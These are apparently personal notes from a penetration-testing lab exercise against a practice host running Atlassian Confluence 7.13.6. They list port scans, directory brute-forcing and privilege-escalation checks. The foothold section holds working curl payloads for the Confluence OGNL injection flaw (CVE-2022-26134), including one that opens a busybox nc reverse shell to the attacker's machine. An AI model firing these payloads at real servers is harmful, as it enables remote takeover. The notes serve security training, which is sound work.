### Enumeration
```
IP=192.168.190.41
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,8090,8091 -A $IP
nc -nvv -w 1 $IP 1-1000 2>&1 | grep -v 'Connection refused'
```
### Ports
- Banner Grab: nc -nv $IP PORT
- 22
	- OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
- 8090
	- opsmessaging
- 8091
	- jamlink
### Foothold
- 8090
	- Default landing page
		- ![[Pasted image 20240725140741.png]]
	- Versions
		- Atlassian Confluence 7.13.6
			- https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/
			- RCE
			- `curl -v http://192.168.190.41:8090/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/
			- In the x cmd response gives the command
			- `curl -v http://192.168.190.41:8090/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27busybox%20nc%20192.168.45.195%2022%20-e%20/bin/bash%27%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/
			- Busybox nc
			- ![[Pasted image 20240726090124.png]]
	- Directory Brute force
		- dirsearch -u http://$IP
			- /webdav
				- GET Login
				- Bad login says authentication denied
				- Apache Tomcat/9.0.58
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
		- Found directories
	- Vulnerability scan
		- nikto -h http://$IP
- 8091
	- Default landing page
	- Versions
	- Directory Brute force
		- dirsearch -u http://$IP
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
		- Found directories
	- Vulnerability scan
		- nikto -h http://$IP
### PE
#### Linux
- confluence
	- id
		- uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
	- sudo -l
		- needs password
	- uname -a
		- `Linux flu 6.2.0-39-generic #40-Ubuntu SMP PREEMPT_DYNAMIC Tue Nov 14 14:18:00 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
	- getcap -r / 2>/dev/null
		- nothing
	- suid
		- find / -type f -perm -04000 -ls 2>/dev/null
			- nothing
	- Users with console
		- confluence
	- netstat -ano
		- Active ports
			- Local ports
				- 33060
				- 2206
				- 56154
				- 8000
	- linpeas
		- Possible Exploits
		- Interesting Files
		- Nothing
	- pspy64
		- ![[Pasted image 20240726090938.png]]
		- ![[Pasted image 20240726091222.png]]
		- ![[Pasted image 20240726091232.png]]
### Credentials
### Lessons Learned